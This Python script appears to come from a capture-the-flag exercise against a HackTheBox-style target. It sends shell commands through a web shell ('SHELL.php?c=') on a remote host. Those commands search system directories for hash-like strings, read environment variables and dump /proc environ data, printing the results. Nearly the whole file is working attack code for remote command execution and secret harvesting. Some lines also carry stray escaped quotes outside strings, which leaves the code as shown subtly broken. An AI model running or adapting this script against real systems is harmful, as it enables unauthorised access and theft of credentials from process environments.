import urllib.request, urllib.parse

cmds = [
    # Search flag patterns more aggressively
    "find /var /opt /tmp /etc -type f -name \"*.txt\" -readable 2>/dev/null | xargs grep -l -E '[a-f0-9]{32}' 2>/dev/null | head -20",
    # Check environment variables 
    "env 2>&1 | grep -i flag",
    "cat /proc/1/environ 2>&1 | tr '\\0' '\\n' | grep -i flag",
    # Check process info
    "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i flag | head -5",
    # Check all readable files in /home (through find)
    "find /home -type f -readable 2>/dev/null | head -20",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and \"Permission denied\" not in result:
            print(f\"=== {cmd[:60]} ===\")
            print(result[:2000])
            print()
    except Exception as e:
        pass
